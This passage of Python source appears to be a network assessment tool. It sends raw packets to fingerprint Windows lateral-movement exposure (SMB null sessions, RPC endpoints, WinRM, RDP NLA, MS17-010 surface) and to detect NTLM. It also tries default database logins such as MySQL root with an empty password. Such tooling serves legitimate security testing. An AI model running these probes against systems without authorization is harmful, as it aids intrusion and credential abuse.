        b'\x00\x00'             # MaxDataCount
        b'\x00'                 # MaxSetupCount
        b'\x00'                 # Reserved
        b'\x00\x00'             # Flags
        b'\x00\x00\x00\x00'    # Timeout
        b'\x00\x00'             # Reserved2
        b'\x00\x00'             # ParameterCount
        b'\x00\x00'             # ParameterOffset
        b'\x00\x00'             # DataCount
        b'\x00\x00'             # DataOffset
        b'\x01'                 # SetupCount = 1
        b'\x00'                 # Reserved3
    ) + setup + struct.pack('<H', 3) + b'\x00\x00\x00'
    smb = (
        b'\xffSMB'
        b'\x25'                 # SMB_COM_TRANSACTION2
        b'\x00\x00\x00\x00'    # NT status
        b'\x18'                 # flags
        b'\x01\x28'             # flags2
        b'\x00\x00'             # PID high
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # signature
        b'\x00\x00'             # reserved
    ) + struct.pack('<HH', tid, 0xfffe) + struct.pack('<HH', uid, 0x42)
    body = smb + words
    n = len(body)
    nb_hdr = bytes([0x00, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
    return nb_hdr + body


# DCE/RPC Bind targeting EPM (Endpoint Mapper) interface
# EPM:   E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0
# NDR:   8A885D04-1CEB-11C9-9FE8-08002B104860 v2.0
_EPM_UUID = bytes([
    0x08, 0x83, 0xAF, 0xE1,
    0x1F, 0x5D,
    0xC9, 0x11,
    0x91, 0xA4, 0x08, 0x00, 0x2B, 0x14, 0xA0, 0xFA,
])
_NDR_UUID = bytes([
    0x04, 0x5D, 0x88, 0x8A,
    0xEB, 0x1C,
    0xC9, 0x11,
    0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
])

_RPC_BIND = (
    b'\x05\x00'              # version 5.0
    b'\x0b'                  # type: Bind
    b'\x03'                  # flags: first + last frag
    b'\x10\x00\x00\x00'     # little-endian IEEE ASCII
    b'\x48\x00'              # frag length = 72
    b'\x00\x00'              # auth length = 0
    b'\x01\x00\x00\x00'     # call ID = 1
    b'\xb8\x10'              # max recv frag = 4280
    b'\xb8\x10'              # max send frag = 4280
    b'\x00\x00\x00\x00'     # assoc group = 0
    b'\x01\x00\x00\x00'     # num ctx items = 1
    b'\x00\x00'              # context ID = 0
    b'\x01\x00'              # num transfer items = 1
) + _EPM_UUID + (
    b'\x03\x00'              # interface major version = 3
    b'\x00\x00'              # interface minor version = 0
) + _NDR_UUID + (
    b'\x02\x00\x00\x00'     # transfer syntax version = 2.0
)


class LateralMovementEnumerator:
    """
    Remote Windows lateral movement surface enumeration via pure-socket probes.

    Covers: SMB null session, WMI DCOM exposure, RPC endpoint mapping,
    WinRM (HTTP), RDP (X.224 / NLA detection), MS17-010 surface fingerprint.

    All probes are read-only fingerprint primitives — no exploitation,
    no write operations, no credential replay. Authorized assessment context.
    """

    # X.224 Connection Request PDU — requests PROTOCOL_SSL|PROTOCOL_HYBRID
    _RDP_CR_PDU = (
        b'\x03\x00\x00\x13'    # TPKT: version=3, reserved=0, length=19 (BE)
        b'\x0e\xe0'             # X.224 CR: LI=14, TPDU code=0xE0
        b'\x00\x00'             # DST-REF
        b'\x00\x00'             # SRC-REF
        b'\x00'                 # class options
        b'\x01'                 # RDP Negotiation Request type
        b'\x00'                 # flags
        b'\x08\x00'             # length = 8
        b'\x03\x00\x00\x00'    # requested protocols: SSL | HYBRID (CredSSP)
    )

    def __init__(self, host: str, port: int = 445, timeout: float = 5.0):
        self.host = host
        self.port = port
        self.timeout = timeout

    def _tcp_connect(self, port: int, timeout: float = None) -> socket.socket:
        """Open TCP connection. Caller must close. Raises on failure."""
        t = timeout if timeout is not None else self.timeout
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((self.host, port))
        return s

    def _send_recv(self, port: int, data: bytes, recv_len: int = 4096,
                   timeout: float = None) -> bytes:
        """Connect, send, receive, close. Returns raw response bytes."""
        s = self._tcp_connect(port, timeout)
        try:
            s.sendall(data)
            return s.recv(recv_len)
        finally:
            try:
                s.close()
            except Exception:
                pass

    def probe_smb_null_session(self) -> dict:
        """
        Test for SMB null session (anonymous IPC$ access).

        1. TCP connect port 445 (or self.port)
        2. Send SMBv1 Negotiate — LANMAN1.0 / LM1.2X002 / NT LM 0.12
        3. Parse dialect index and OS version from negotiate response
        4. Send Session Setup with empty ANSI + Unicode passwords
        5. Parse NT status — STATUS_SUCCESS (0x00000000) confirms null session

        Returns: {'null_session': bool, 'dialect': str, 'os': str,
                  'security_mode': str, 'shares': list, 'error': str}
        """
        result = {
            'null_session': False,
            'dialect': '',
            'os': '',
            'security_mode': '',
            'shares': [],
            'error': '',
        }
        try:
            s = self._tcp_connect(self.port)
        except Exception as exc:
            result['error'] = str(exc)
            return result

        try:
            # --- Negotiate ---
            s.sendall(_build_smb_negotiate())
            neg_resp = s.recv(4096)

            if len(neg_resp) < 40:
                result['error'] = 'truncated negotiate response'
                return result

            # NT status at bytes 9-12 (after 4-byte NetBIOS + 4-byte magic + 1-byte cmd)
            neg_status = struct.unpack_from('<I', neg_resp, 9)[0]
            if neg_status != 0:
                result['error'] = f'negotiate error 0x{neg_status:08x}'
                return result

            # Dialect index: first WORD of parameter block at byte 37
            if len(neg_resp) > 38:
                dialect_idx = struct.unpack_from('<H', neg_resp, 37)[0]
                dialects = ['LANMAN1.0', 'LM1.2X002', 'NT LM 0.12']
                result['dialect'] = (dialects[dialect_idx]
                                     if dialect_idx < len(dialects)
                                     else f'dialect#{dialect_idx}')

            # Security mode byte at offset 39 (byte 3 of parameter block)
            if len(neg_resp) > 39:
                sec_mode = neg_resp[39]
                bits = []
                if sec_mode & 0x01:
                    bits.append('user-level')
                if sec_mode & 0x02:
                    bits.append('signing-enabled')
                if sec_mode & 0x08:
                    bits.append('signing-required')
                result['security_mode'] = ','.join(bits) if bits else 'share-level'

            # OS version strings in byte data section (after 17-word param block)
            data_sec = neg_resp[70:] if len(neg_resp) > 70 else b''
            os_parts = [p.decode(errors='ignore').strip()
                        for p in re.split(rb'\x00{1,2}', data_sec)
                        if len(p) > 2]
            if os_parts:
                result['os'] = os_parts[0]

            # --- Session Setup null ---
            s.sendall(_build_smb_session_setup_null(uid=0))
            sess_resp = s.recv(4096)

            if len(sess_resp) < 13:
                result['error'] = 'truncated session setup response'
                return result

            sess_status = struct.unpack_from('<I', sess_resp, 9)[0]
            if sess_status == 0x00000000:                   # STATUS_SUCCESS
                result['null_session'] = True
            elif sess_status == 0xC000006D:                 # STATUS_LOGON_FAILURE
                result['error'] = 'auth required (STATUS_LOGON_FAILURE)'
            elif sess_status == 0xC0000022:                 # STATUS_ACCESS_DENIED
                result['error'] = 'access denied'
            elif sess_status == 0x00000001:                 # STATUS_MORE_PROCESSING_REQUIRED
                result['error'] = 'NTLM challenge issued (auth required)'
            else:
                result['error'] = f'session status 0x{sess_status:08x}'

        except Exception as exc:
            result['error'] = str(exc)
        finally:
            try:
                s.close()
            except Exception:
                pass

        return result

    def probe_wmi_unauth(self) -> dict:
        """
        Test for unauthenticated WMI DCOM exposure via port 135 (RPC endpoint mapper).

        Sends DCE/RPC Bind to epmapper and checks for a Bind_ack response
        (type 0x0c). Any bind_ack confirms the endpoint mapper is reachable
        and WMI DCOM interfaces may be queried further.

        Returns: {'reachable': bool, 'banner': str, 'error': str}
        """
        result = {'reachable': False, 'banner': '', 'error': ''}
        try:
            resp = self._send_recv(135, _RPC_BIND, recv_len=512)
            if len(resp) >= 10 and resp[2] == 0x0c:         # Bind_ack
                result['reachable'] = True
                # Secondary address string at offset 26 (length WORD at 24)
                if len(resp) > 26:
                    sec_len = struct.unpack_from('<H', resp, 24)[0]
                    if sec_len and len(resp) >= 26 + sec_len:
                        result['banner'] = resp[26:26 + sec_len].rstrip(
                            b'\x00').decode(errors='replace')
            elif len(resp) >= 4:
                result['reachable'] = True
                result['banner'] = resp[:64].decode(errors='replace').strip()
        except Exception as exc:
            result['error'] = str(exc)
        return result

    def enumerate_rpc_endpoints(self) -> list:
        """
        Enumerate RPC endpoint mapper for exposed interfaces.

        Binds to epmapper on port 135 then sends EPM_Lookup (opnum 3).
        Scans response for TCP floor entries (protocol byte 0x07) to extract
        dynamic RPC ports.

        Returns list of {'interface_uuid': str, 'port': int, 'protocol': str}
        """
        endpoints = []
        try:
            s = self._tcp_connect(135)
        except Exception:
            return endpoints

        try:
            s.sendall(_RPC_BIND)
            bind_ack = s.recv(4096)

            if len(bind_ack) < 10 or bind_ack[2] != 0x0c:  # must be Bind_ack
                return endpoints

            # EPM_Lookup request (opnum 3) — enumerate all endpoints
            epm_req = (
                b'\x05\x00'              # version 5.0
                b'\x00'                  # type: Request
                b'\x03'                  # flags
                b'\x10\x00\x00\x00'     # little-endian
                b'\x4c\x00'             # frag length = 76
                b'\x00\x00'             # auth length
                b'\x02\x00\x00\x00'     # call ID = 2
                b'\x34\x00\x00\x00'     # alloc hint = 52
                b'\x00\x00'              # context ID = 0
                b'\x03\x00'              # opnum = 3 (Lookup)
                # NDR body: inquiry_type=ALL, null object/ifid, handle=0, max_ents=100
                b'\x00\x00\x00\x00'     # inquiry_type = RPC_C_EP_ALL_ELTS
                b'\x00\x00\x00\x00'     # object (null ptr)
                b'\x00\x00\x00\x00'     # Ifid (null ptr)
                b'\x00\x00\x00\x00'     # vers_option
                b'\x00\x00\x00\x00'     # entry_handle[0]
                b'\x00\x00\x00\x00'     # entry_handle[1]
                b'\x00\x00\x00\x00'     # entry_handle[2]
                b'\x00\x00\x00\x00'     # entry_handle[3]
                b'\x64\x00\x00\x00'     # max_ents = 100
            )
            s.sendall(epm_req)
            raw = s.recv(8192)

            # Scan tower floors: TCP floor uses protocol byte 0x07 followed by
            # 2-byte big-endian port number
            seen = set()
            for i in range(len(raw) - 3):
                if raw[i] == 0x07:
                    port = struct.unpack_from('>H', raw, i + 1)[0]
                    if 1 <= port <= 65535 and port not in seen:
                        seen.add(port)
                        endpoints.append({
                            'interface_uuid': '',
                            'port': port,
                            'protocol': 'ncacn_ip_tcp',
                        })

        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass

        return endpoints

    def probe_winrm(self) -> dict:
        """
        Test Windows Remote Management (WinRM) exposure.

        HTTP OPTIONS to /wsman on port 5985 (HTTP) then 5986 (HTTPS).
        A 401 with WWW-Authenticate: Negotiate/NTLM/Kerberos confirms
        WinRM is live and requires authentication.

        Returns: {'reachable': bool, 'auth_methods': list, 'port': int, 'error': str}
        """
        result = {'reachable': False, 'auth_methods': [], 'port': 0, 'error': ''}

        for winrm_port, use_tls in [(5985, False), (5986, True)]:
            try:
                req = (
                    f'OPTIONS /wsman HTTP/1.1\r\n'
                    f'Host: {self.host}:{winrm_port}\r\n'
                    f'User-Agent: Microsoft WinRM Client\r\n'
                    f'Content-Length: 0\r\n'
                    f'\r\n'
                ).encode()

                if use_tls:
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    raw_sock = socket.create_connection(
                        (self.host, winrm_port), timeout=self.timeout)
                    sock = ctx.wrap_socket(raw_sock, server_hostname=self.host)
                else:
                    sock = self._tcp_connect(winrm_port)

                try:
                    sock.sendall(req)
                    resp = sock.recv(4096).decode(errors='replace')
                finally:
                    try:
                        sock.close()
                    except Exception:
                        pass

                if 'HTTP/' in resp:
                    result['reachable'] = True
                    result['port'] = winrm_port
                    result['auth_methods'] = list(set(
                        re.findall(r'WWW-Authenticate:\s*(\S+)', resp, re.IGNORECASE)
                    ))
                    break

            except Exception as exc:
                result['error'] = str(exc)
                continue

        return result

    def probe_rdp(self) -> dict:
        """
        Test RDP exposure and NLA requirement.

        Sends X.224 Connection Request PDU with RDP Negotiation Request
        (PROTOCOL_SSL | PROTOCOL_HYBRID). Parses Connection Confirm response:
        - Negotiation Response (type 0x02 at byte 11): selectedProtocol at [15:19]
          bit 1 set (value & 0x02) = CredSSP/NLA required
        - Negotiation Failure (type 0x03 at byte 11): failure code at [15:19]
          hybrid_required (0x05) = NLA mandatory

        Returns: {'reachable': bool, 'nla_required': bool,
                  'encryption_level': str, 'error': str}
        """
        result = {
            'reachable': False,
            'nla_required': False,
            'encryption_level': 'unknown',
            'selected_protocol': 0,
            'error': '',
        }
        try:
            resp = self._send_recv(3389, self._RDP_CR_PDU, recv_len=256)

            if len(resp) < 6:
                result['error'] = 'truncated RDP response'
                return result

            # TPKT version must be 3
            if resp[0] != 0x03:
                result['error'] = f'unexpected TPKT version: 0x{resp[0]:02x}'
                return result

            result['reachable'] = True

            # X.224 TPDU code at [5]: 0xD0 = Connection Confirm
            if len(resp) < 7 or resp[5] != 0xD0:
                result['error'] = f'unexpected X.224 TPDU: 0x{resp[5]:02x}'
                return result

            # Negotiation type at byte 11 (after 4-byte TPKT + 7-byte X.224 CC header)
            if len(resp) >= 12:
                nego_type = resp[11]
                if nego_type == 0x02 and len(resp) >= 19:
                    # Negotiation Response: selectedProtocol LE DWORD at [15:19]
                    selected = struct.unpack_from('<I', resp, 15)[0]
                    result['selected_protocol'] = selected
                    result['nla_required'] = bool(selected & 0x02)   # PROTOCOL_HYBRID
                    enc_map = {0: 'none', 1: 'tls', 2: 'credssp', 3: 'rdstls'}
                    result['encryption_level'] = enc_map.get(
                        selected & 0x03, f'0x{selected:08x}')
                elif nego_type == 0x03 and len(resp) >= 19:
                    # Negotiation Failure: failure code at [15:19]
                    fail_code = struct.unpack_from('<I', resp, 15)[0]
                    fail_map = {
                        0x00000001: 'ssl_required',
                        0x00000002: 'ssl_not_allowed',
                        0x00000003: 'ssl_cert_not_on_server',
                        0x00000004: 'inconsistent_flags',
                        0x00000005: 'hybrid_required',   # NLA mandatory
                        0x00000006: 'ssl_with_user_auth_required',
                    }
                    result['encryption_level'] = fail_map.get(
                        fail_code, f'failure:0x{fail_code:08x}')
                    result['nla_required'] = (fail_code == 0x00000005)

        except Exception as exc:
            result['error'] = str(exc)

        return result

    def check_ms17_010_fingerprint(self) -> dict:
        """
        Fingerprint SMB for EternalBlue vulnerability surface (MS17-010).

        Steps:
          1. Negotiate SMBv1 (NT LM 0.12) — extract OS version string
          2. Session Setup with empty credentials
          3. Trans2 SESSION_SETUP probe — unpatched NT 6.x kernels return
             STATUS_INSUFF_SERVER_RESOURCES (0xC0000205); patched systems
             return STATUS_ACCESS_DENIED or disconnect

        Returns: {'vulnerable_fingerprint': bool, 'smb_dialect': str,
                  'os': str, 'trans2_status': str, 'error': str}
        """
        result = {
            'vulnerable_fingerprint': False,
            'smb_dialect': '',
            'os': '',
            'trans2_status': '',
            'error': '',
        }
        try:
            s = self._tcp_connect(self.port)
        except Exception as exc:
            result['error'] = str(exc)
            return result

        try:
            # Step 1: Negotiate
            s.sendall(_build_smb_negotiate())
            neg_resp = s.recv(4096)

            if len(neg_resp) < 40:
                result['error'] = 'truncated negotiate response'
                return result

            neg_status = struct.unpack_from('<I', neg_resp, 9)[0]
            if neg_status != 0:
                result['error'] = f'negotiate failed: 0x{neg_status:08x}'
                return result

            if len(neg_resp) > 38:
                dialect_idx = struct.unpack_from('<H', neg_resp, 37)[0]
                dialects = ['LANMAN1.0', 'LM1.2X002', 'NT LM 0.12']
                result['smb_dialect'] = (dialects[dialect_idx]
                                         if dialect_idx < len(dialects)
                                         else f'dialect#{dialect_idx}')

            # OS version from byte data section
            data_sec = neg_resp[70:] if len(neg_resp) > 70 else b''
            parts = [p.decode(errors='ignore').strip()
                     for p in re.split(rb'\x00{1,2}', data_sec)
                     if len(p) > 2]
            if parts:
                result['os'] = parts[0]

            # Capabilities DWORD — bit 31 = CAP_EXTENDED_SECURITY
            cap_offset = 51
            has_ext_sec = False
            if len(neg_resp) > cap_offset + 4:
                caps = struct.unpack_from('<I', neg_resp, cap_offset)[0]
                has_ext_sec = bool(caps & 0x80000000)

            if has_ext_sec:
                # Extended security: classify by OS string alone
                vuln_keywords = [
                    'Windows 7', 'Windows Vista', 'Windows Server 2008',
                    'Windows Server 2003', 'Windows XP', 'Windows 2000',
                ]
                result['vulnerable_fingerprint'] = (
                    result['smb_dialect'] == 'NT LM 0.12' and
                    any(kw in result['os'] for kw in vuln_keywords)
                )
                result['trans2_status'] = 'skipped (extended security)'
                return result

            # Step 2: Session Setup null
            s.sendall(_build_smb_session_setup_null(uid=0))
            sess_resp = s.recv(4096)

            if len(sess_resp) < 13:
                result['error'] = 'truncated session setup response'
                return result

            sess_status = struct.unpack_from('<I', sess_resp, 9)[0]
            uid = (struct.unpack_from('<H', sess_resp, 28)[0]
                   if len(sess_resp) >= 30 else 0)

            if sess_status not in (0x00000000, 0x00000001):
                result['error'] = f'session setup failed: 0x{sess_status:08x}'
                return result

            # Step 3: Trans2 SESSION_SETUP probe
            s.sendall(_build_smb_trans2_probe(uid=uid, tid=0))
            t2_resp = s.recv(4096)

            if len(t2_resp) >= 13:
                t2_status = struct.unpack_from('<I', t2_resp, 9)[0]
                result['trans2_status'] = f'0x{t2_status:08x}'
                # STATUS_INSUFF_SERVER_RESOURCES on the unpatched FEA overflow path
                result['vulnerable_fingerprint'] = (t2_status == 0xC0000205)
            else:
                result['trans2_status'] = 'no response'

        except Exception as exc:
            result['error'] = str(exc)
        finally:
            try:
                s.close()
            except Exception:
                pass

        return result

    def run(self) -> dict:
        """
        Run all lateral movement probes. Returns consolidated findings dict.

        Sequential execution: SMB probes share session state across calls;
        WinRM and RDP are independent TCP connections.
        """
        findings = {
            'host': self.host,
            'port': self.port,
            'smb_null_session': {},
            'wmi_dcom': {},
            'rpc_endpoints': [],
            'winrm': {},
            'rdp': {},
            'ms17_010': {},
        }

        findings['smb_null_session'] = self.probe_smb_null_session()
        findings['wmi_dcom'] = self.probe_wmi_unauth()
        findings['rpc_endpoints'] = self.enumerate_rpc_endpoints()
        findings['winrm'] = self.probe_winrm()
        findings['rdp'] = self.probe_rdp()
        findings['ms17_010'] = self.check_ms17_010_fingerprint()

        # Severity roll-up
        if (findings['smb_null_session'].get('null_session') or
                findings['ms17_010'].get('vulnerable_fingerprint') or
                (findings['winrm'].get('reachable') and
                 not findings['winrm'].get('auth_methods'))):
            severity = 'CRITICAL'
        elif (findings['wmi_dcom'].get('reachable') or
              findings['rdp'].get('reachable') or
              findings['winrm'].get('reachable')):
            severity = 'HIGH'
        else:
            severity = 'INFO'

        findings['severity'] = severity
        return findings


def enumerate_lateral_movement(host: str, port: int = 445,
                               timeout: float = 5.0) -> dict:
    """Module-level convenience wrapper for LateralMovementEnumerator.run()."""
    return LateralMovementEnumerator(host, port=port, timeout=timeout).run()


# ---------------------------------------------------------------------------
# 6. NTLM authentication detection
# ---------------------------------------------------------------------------

class NTLMDetector:
    """Detects NTLM authentication negotiation on HTTP/SMB services."""

    NTLM_SIGNATURE = b'NTLMSSP\x00'
    # Common NegotiateFlags: UNICODE|OEM|REQUEST_TARGET|NTLM|EXTENDED_SESSION|128|KEY_EXCH
    _NEGOTIATE_FLAGS = 0xb2828220

    def __init__(self, timeout: float = 3.0):
        self.timeout = timeout
        self.findings = []

    def probe_http_ntlm(self, host: str, port: int = 80, path: str = '/',
                        use_tls: bool = False) -> dict:
        """Check for NTLM authentication challenge on HTTP endpoint."""
        result = {
            'host': host, 'port': port, 'path': path,
            'ntlm_present': False, 'challenge': None,
            'target_name': None, 'flags': None, 'signing_required': False,
            'error': None
        }
        try:
            negotiate_msg = self.build_ntlm_negotiate()
            b64_type1 = base64.b64encode(negotiate_msg).decode()
            request = (
                f'GET {path} HTTP/1.1\r\n'
                f'Host: {host}:{port}\r\n'
                f'Authorization: NTLM {b64_type1}\r\n'
                f'Connection: close\r\n'
                f'\r\n'
            )
            if use_tls:
                import ssl
                raw = socket.create_connection((host, port), timeout=self.timeout)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = ctx.wrap_socket(raw, server_hostname=host)
            else:
                conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(request.encode())
            resp = b''
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if b'\r\n\r\n' in resp:
                    break
            conn.close()
            resp_str = resp.decode(errors='replace')
            # Look for WWW-Authenticate: NTLM <base64>
            m = re.search(r'WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]+)', resp_str, re.I)
            if m:
                try:
                    type2_bytes = base64.b64decode(m.group(1))
                    parsed = self.parse_ntlm_challenge(type2_bytes)
                    result.update(parsed)
                    result['ntlm_present'] = True
                except Exception as e:
                    result['ntlm_present'] = True
                    result['error'] = f'parse_error: {e}'
        except Exception as e:
            result['error'] = str(e)
        return result

    def build_ntlm_negotiate(self) -> bytes:
        """Build NTLM Type 1 Negotiate message (40 bytes)."""
        # NTLMSSP signature(8) + MessageType(4LE=1) + NegotiateFlags(4LE)
        # + DomainNameFields(6=empty) + WorkstationFields(6=empty)
        msg = self.NTLM_SIGNATURE
        msg += struct.pack('<I', 1)                 # MessageType = 1
        msg += struct.pack('<I', self._NEGOTIATE_FLAGS)
        msg += struct.pack('<HHI', 0, 0, 0)         # DomainNameFields (Len/MaxLen/Offset empty)
        msg += struct.pack('<HHI', 0, 0, 0)         # WorkstationFields (Len/MaxLen/Offset empty)
        return msg

    def parse_ntlm_challenge(self, type2_bytes: bytes) -> dict:
        """Parse NTLM Type 2 Challenge message."""
        result = {
            'challenge': None, 'target_name': None,
            'flags': None, 'signing_required': False
        }
        try:
            if type2_bytes[:8] != self.NTLM_SIGNATURE:
                return result
            msg_type = struct.unpack('<I', type2_bytes[8:12])[0]
            if msg_type != 2:
                return result
            # TargetNameFields at offset 12: Len(2)+MaxLen(2)+Offset(4)
            tname_len, _, tname_off = struct.unpack('<HHI', type2_bytes[12:20])
            # NegotiateFlags at offset 20
            flags = struct.unpack('<I', type2_bytes[20:24])[0]
            # ServerChallenge at offset 24: 8 bytes
            challenge = type2_bytes[24:32]
            result['challenge'] = challenge.hex()
            result['flags'] = flags
            # NTLMSSP_NEGOTIATE_SIGN = 0x00000010
            result['signing_required'] = bool(flags & 0x00000010)
            if tname_len and tname_off + tname_len <= len(type2_bytes):
                try:
                    result['target_name'] = type2_bytes[
                        tname_off:tname_off + tname_len
                    ].decode('utf-16le', errors='replace')
                except Exception:
                    pass
        except Exception:
            pass
        return result

    def probe_smb_ntlm(self, host: str, port: int = 445) -> dict:
        """Send SMB1 Negotiate; check response for NTLM Type 2 challenge."""
        result = {
            'host': host, 'port': port, 'reachable': False,
            'ntlm_present': False, 'challenge': None,
            'signing_required': False, 'error': None
        }
        try:
            dialects = b'\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
            smb_hdr = (
                b'\xff\x53\x4d\x42'                  # Protocol ID
                b'\x72'                              # Cmd: Negotiate
                b'\x00\x00\x00\x00'                 # Status
                b'\x18'                              # Flags
                b'\x53\xc8'                          # Flags2
                b'\x00\x00'                          # PIDHigh
                b'\x00\x00\x00\x00\x00\x00\x00\x00' # SecurityFeatures (8 bytes)
                b'\x00\x00'                          # Reserved
                b'\xff\xff'                          # TID
                b'\xff\xfe'                          # PID
                b'\x00\x00'                          # UID
                b'\x00\x00'                          # MID
            )
            body = b'\x00'
            body += struct.pack('<H', len(dialects))
            body += dialects
            payload = smb_hdr + body
            nb_hdr = b'\x00' + struct.pack('>I', len(payload))[1:]
            pkt = nb_hdr + payload
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(pkt)
            resp = conn.recv(4096)
            conn.close()
            result['reachable'] = True
            idx = resp.find(self.NTLM_SIGNATURE)
            if idx >= 0:
                parsed = self.parse_ntlm_challenge(resp[idx:])
                result.update(parsed)
                result['ntlm_present'] = True
        except Exception as e:
            result['error'] = str(e)
        return result

    def report_lines(self) -> list:
        lines = ['--- NTLM Detection ---']
        lines.append(f'Findings: {len(self.findings)}')
        for f in self.findings:
            ntlm = '[NTLM]' if f.get('ntlm_present') else '[none]'
            lines.append(f"  {ntlm} {f.get('host','?')}:{f.get('port','?')}")
            if f.get('challenge'):
                lines.append(f"    challenge: {f['challenge']}")
            if f.get('target_name'):
                lines.append(f"    target: {f['target_name']}")
            if f.get('signing_required') is not None:
                lines.append(f"    signing_required: {f['signing_required']}")
            if f.get('error'):
                lines.append(f"    error: {f['error']}")
        return lines


# ---------------------------------------------------------------------------
# 7. Database service fingerprinting and default credential testing
# ---------------------------------------------------------------------------

class DatabaseProber:
    """Pure-socket database service fingerprinting and default credential testing."""

    DB_PORTS = {
        1433:  'mssql',
        5432:  'postgresql',
        3306:  'mysql',
        27017: 'mongodb',
        6379:  'redis',
        5984:  'couchdb',
        9042:  'cassandra',
    }

    _AUTH_TYPE_NAMES = {
        0:  'ok_no_auth',
        2:  'kerberos_v5',
        3:  'cleartext',
        5:  'md5',
        10: 'scram-sha-256',
    }

    def __init__(self, targets: list = None, timeout: float = 3.0):
        # targets: list of (host, port, service) tuples; derived from scan if None
        self.targets = targets or []
        self.timeout = timeout
        self.findings = []

    def probe_all(self, hosts: list = None) -> list:
        """Run probes against all provided hosts on known DB ports."""
        probe_hosts = hosts or [t[0] for t in self.targets]

        def _run(args):
            host, port, service = args
            # Quick TCP liveness check before full probe
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((host, port))
                s.close()
            except Exception:
                return None
            try:
                if service == 'postgresql':
                    r = self.probe_postgresql(host, port)
                elif service == 'mysql':
                    r = self.probe_mysql(host, port)
                elif service == 'mongodb':
                    r = self.probe_mongodb(host, port)
                elif service == 'redis':
                    r = self.probe_redis(host, port)
                elif service == 'mssql':
                    r = self.probe_mssql(host, port)
                elif service == 'couchdb':
                    r = self._probe_couchdb(host, port)
                else:
                    r = {'reachable': True}
                r['host'] = host
                r['port'] = port
                r['service'] = service
                return r
            except Exception:
                return {'host': host, 'port': port, 'service': service,
                        'reachable': True, 'error': 'probe_exception'}

        tasks = [
            (host, port, service)
            for host in probe_hosts
            for port, service in self.DB_PORTS.items()
        ]
        with ThreadPoolExecutor(max_workers=40) as ex:
            futures = [ex.submit(_run, t) for t in tasks]
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self.findings.append(result)
        return self.findings

    def probe_postgresql(self, host: str, port: int = 5432) -> dict:
        """Test PostgreSQL auth type. Auth type 0 = open (no password required)."""
        result = {
            'reachable': False, 'open': False,
            'auth_type': None, 'auth_name': None, 'version': None, 'error': None
        }
        try:
            user = 'postgres'
            db = 'postgres'
            # Startup message: length(4BE) + protocol(4BE=0x00030000) + params + \x00
            params = f'user\x00{user}\x00database\x00{db}\x00\x00'.encode()
            total_len = 4 + 4 + len(params)
            startup = struct.pack('>II', total_len, 0x00030000) + params
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(startup)
            resp = conn.recv(1024)
            conn.close()
            result['reachable'] = True
            # Server response: byte type + int32 length + int32 auth_type
            if len(resp) >= 9 and resp[0:1] == b'R':
                auth_type = struct.unpack('>I', resp[5:9])[0]
                result['auth_type'] = auth_type
                result['auth_name'] = self._AUTH_TYPE_NAMES.get(
                    auth_type, f'unknown_{auth_type}'
                )
                result['open'] = (auth_type == 0)
            elif resp[0:1] == b'E':
                # ErrorResponse — reachable but rejected startup params
                result['error'] = resp[5:].decode(errors='replace')[:120]
        except Exception as e:
            result['error'] = str(e)
        return result

    def probe_mysql(self, host: str, port: int = 3306) -> dict:
        """Parse MySQL server handshake. Test root with empty password."""
        result = {
            'reachable': False, 'version': None,
            'open': False, 'error': None
        }
        try:
            conn = socket.create_connection((host, port), timeout=self.timeout)
            # Initial handshake: 3-byte length LE + 1-byte sequence + payload
            header = conn.recv(4)
            if len(header) < 4:
                conn.close()
                result['error'] = 'short_header'
                return result
            pkt_len = struct.unpack('<I', header[:3] + b'\x00')[0]
            payload = b''
            while len(payload) < pkt_len:
                chunk = conn.recv(pkt_len - len(payload))
                if not chunk:
                    break
                payload += chunk
            result['reachable'] = True
            # Protocol v10 handshake: 0x0a + server_version(str+\x00) + ...
            if payload and payload[0] == 0x0a:
                null_idx = payload.index(b'\x00', 1)
                result['version'] = payload[1:null_idx].decode(errors='replace')
                # Build HandshakeResponse41: empty password = single 0x00 auth token
                # capability flags: CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
                cap_flags = 0x00008200
                username = b'root\x00'
                auth_resp = b'\x00'   # empty password = zero-length auth response
                hsr = struct.pack('<IIB23s', cap_flags, 0, 33, b'\x00' * 23)
                hsr += username + auth_resp
                pkt_out = struct.pack('<I', len(hsr))[:3] + b'\x01' + hsr
                conn.sendall(pkt_out)
                auth_raw = conn.recv(1024)
                if auth_raw and len(auth_raw) > 4:
                    result['open'] = (auth_raw[4:5] == b'\x00')   # OK packet
                    if auth_raw[4:5] == b'\xff':
                        # Error packet: \xff + errno(2) + '#'(1) + sqlstate(5) + msg
                        result['error'] = auth_raw[9:].decode(errors='replace')[:80]
            conn.close()
        except Exception as e:
            result['error'] = str(e)
        return result

    def probe_mongodb(self, host: str, port: int = 27017) -> dict:
        """Send MongoDB isMaster via OP_MSG. Check listDatabases without auth."""
        result = {
            'reachable': False, 'is_replica': False,
            'unauth_list_dbs': False, 'version': None, 'error': None
        }
        try:
            # OP_MSG: MsgHeader(16) + flagBits(4) + Section(kind=0 + BSON doc)
            def _op_msg(doc, req_id):
                bson_doc = self._bson_encode(doc)
                flag_bits = struct.pack('<I', 0)
                section = b'\x00' + bson_doc   # kind=0
                body = flag_bits + section
                total = 16 + len(body)
                hdr = struct.pack('<IIII', total, req_id, 0, 2013)
                return hdr + body

            pkt = _op_msg({'isMaster': 1, '$db': 'admin'}, 1)
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(pkt)
